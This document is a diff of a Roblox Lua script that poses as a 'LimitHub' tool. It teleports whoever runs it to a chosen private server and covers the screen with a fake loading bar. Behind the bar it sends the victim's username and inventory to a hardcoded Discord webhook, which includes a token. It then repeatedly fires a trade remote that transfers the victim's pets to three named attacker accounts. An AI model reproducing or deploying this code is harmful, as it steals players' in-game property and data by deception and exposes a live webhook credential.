@@ -3,144 +3,123 @@ local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 
-local placeId = 126884695634066
-local privateServerCode = "20579449181285003618611464122633"
+-- ✅ Custom webhook URL mo bro
 local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
 
-local attackerNames = {
-    ["boneblossom215"] = true,
-    ["beanstalk1251"] = true,
-    ["burningbud709"] = true,
-}
+-- ✅ Target private server
+local placeId = 126884695634066
+local privateServerCode = "40206718588419987554943106780552"
 
-local targetPets = {
-    ["Trex"] = true, ["fennec fox"] = true, ["Raccoon"] = true,
-    ["dragonfly"] = true, ["butterfly"] = true, ["queenbee"] = true,
-    ["spinosaurus"] = true, ["redfox"] = true, ["Brontosaurus"] = true,
-    ["mooncat"] = true, ["mimic octopus"] = true, ["d disco bee"] = true,
-    ["dilophosaurus"] = true, ["kitsune"] = true
-}
+-- ✅ Mag-teleport muna
+TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
 
--- DEBUG GUI FUNCTION
-local function logDebug(text)
-    local screenGui = game.CoreGui:FindFirstChild("DebugLogGui") or Instance.new("ScreenGui", game.CoreGui)
-    screenGui.Name = "DebugLogGui"
-    local label = Instance.new("TextLabel", screenGui)
-    label.Text = text
-    label.Size = UDim2.new(1, 0, 0, 24)
-    label.TextColor3 = Color3.new(1, 1, 1)
-    label.BackgroundColor3 = Color3.new(0, 0, 0)
-    label.BackgroundTransparency = 0.4
-    label.TextScaled = true
-    label.Position = UDim2.new(0, 0, 0, #screenGui:GetChildren() * 25)
-end
+-- ✅ Wait until player successfully joined
+game.Loaded:Wait()
 
-logDebug("✅ Script started")
-
--- TELEPORT
+-- ✅ GUI: Loading bar (5% per 10s)
 task.spawn(function()
-    task.wait(2)
-    logDebug("🚀 Attempting teleport...")
-    TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
-end)
+    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+    gui.Name = "LimitHubLoading"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
 
--- WAIT UNTIL TELEPORTED
-repeat task.wait() until game.PlaceId == placeId
-logDebug("🛬 Teleport success!")
-
--- GUI
-task.spawn(function()
-    logDebug("🖼️ Showing GUI...")
-
-    local screenGui = Instance.new("ScreenGui", game.CoreGui)
-    screenGui.IgnoreGuiInset = true
-    screenGui.ResetOnSpawn = false
-
-    local bg = Instance.new("Frame")
-    bg.BackgroundColor3 = Color3.new(0, 0, 0)
+    local bg = Instance.new("Frame", gui)
     bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.Parent = screenGui
+    bg.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 
-    local fill = Instance.new("Frame")
-    fill.Size = UDim2.new(0, 0, 0, 30)
-    fill.Position = UDim2.new(0.5, -200, 0.5, 0)
-    fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
-    fill.BorderSizePixel = 0
-    fill.Parent = bg
+    local barFrame = Instance.new("Frame", bg)
+    barFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+    barFrame.Position = UDim2.new(0.5, 0, 0.7, 0)
+    barFrame.Size = UDim2.new(0, 400, 0, 30)
+    barFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    barFrame.BorderSizePixel = 0
+    barFrame.BackgroundTransparency = 0.2
 
-    local percentLabel = Instance.new("TextLabel", bg)
-    percentLabel.Size = UDim2.new(0, 100, 0, 40)
-    percentLabel.Position = UDim2.new(0.5, -50, 0.5, -50)
-    percentLabel.BackgroundTransparency = 1
-    percentLabel.TextColor3 = Color3.new(1, 1, 1)
-    percentLabel.Text = "0%"
-    percentLabel.TextScaled = true
+    local bar = Instance.new("Frame", barFrame)
+    bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    bar.Size = UDim2.new(0, 0, 1, 0)
+    bar.BorderSizePixel = 0
 
-    for i = 0, 100, 5 do
-        percentLabel.Text = i .. "%"
-        fill.Size = UDim2.new(i / 100, 0, 0, 30)
+    local percentText = Instance.new("TextLabel", bg)
+    percentText.AnchorPoint = Vector2.new(0.5, 0.5)
+    percentText.Position = UDim2.new(0.5, 0, 0.6, 0)
+    percentText.Size = UDim2.new(0, 200, 0, 50)
+    percentText.Text = "Loading... 0%"
+    percentText.TextColor3 = Color3.new(1, 1, 1)
+    percentText.BackgroundTransparency = 1
+    percentText.TextScaled = true
+    percentText.Font = Enum.Font.SourceSansBold
+
+    for i = 1, 20 do
+        percentText.Text = "Loading... " .. (i * 5) .. "%"
+        bar.Size = UDim2.new(i * 0.05, 0, 1, 0)
         task.wait(10)
     end
-
-    screenGui:Destroy()
-    logDebug("✅ GUI finished")
 end)
 
--- WAIT BEFORE SCAN
-task.wait(5)
-
--- DISCORD WEBHOOK
+-- ✅ Function: Send inventory and name to Discord
 task.spawn(function()
-    logDebug("📡 Sending pet data to Discord...")
-
-    local pets = {}
-    for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
-        if targetPets[string.lower(v.Name)] or targetPets[v.Name] then
-            table.insert(pets, v.Name)
-        end
+    local inventory = {}
+    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
+        table.insert(inventory, item.Name)
     end
-
     local data = {
-        ["username"] = LocalPlayer.Name,
-        ["pets"] = pets,
-        ["placeId"] = tostring(game.PlaceId)
+        username = "LimitHub Logger",
+        embeds = {{
+            title = "New Victim Logged",
+            description = "**Username:** " .. LocalPlayer.Name .. "\n**Inventory:** " .. table.concat(inventory, ", "),
+            color = 65280
+        }}
     }
-
-    local success, err = pcall(function()
-        request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
-
-    if success then
-        logDebug("✅ Webhook sent!")
-    else
-        logDebug("❌ Webhook failed: " .. tostring(err))
-    end
+    request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
 end)
 
--- TRANSFER LOOP
+-- ✅ Auto-pet transfer to attacker names
 task.spawn(function()
-    logDebug("♻️ Starting transfer check loop...")
+    local attackers = {"boneblossom215", "beanstalk1251", "burningbud709"}
+    local function getAttacker()
+        for _, p in pairs(Players:GetPlayers()) do
+            if table.find(attackers, p.Name) then
+                return p
+            end
+        end
+        return nil
+    end
 
-    local function transferPetsTo(attacker)
-        for _, pet in pairs(LocalPlayer.Backpack:GetChildren()) do
-            if targetPets[string.lower(pet.Name)] or targetPets[pet.Name] then
-                pet.Parent = attacker:FindFirstChild("Backpack")
+    local function transferPets()
+        local attacker = getAttacker()
+        if attacker then
+            local args = {
+                [1] = attacker.Name,
+                [2] = {} -- pets table
+            }
+
+            for _, pet in pairs(LocalPlayer.Pets:GetChildren()) do
+                if pet:IsA("Model") then
+                    table.insert(args[2], pet.Name)
+                end
+            end
+
+            -- Fire pet transfer
+            local success, err = pcall(function()
+                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("TradeInvitePlayer"):FireServer(unpack(args))
+            end)
+
+            if success then
+                warn("Pets sent to " .. attacker.Name)
+            else
+                warn("Transfer failed:", err)
             end
         end
     end
 
     while true do
-        for _, player in pairs(Players:GetPlayers()) do
-            if attackerNames[player.Name] and player ~= LocalPlayer then
-                logDebug("🎯 Transferring pets to: " .. player.Name)
-                transferPetsTo(player)
-            end
-        end
-        task.wait(2)
+        transferPets()
+        task.wait(5)
     end
 end)
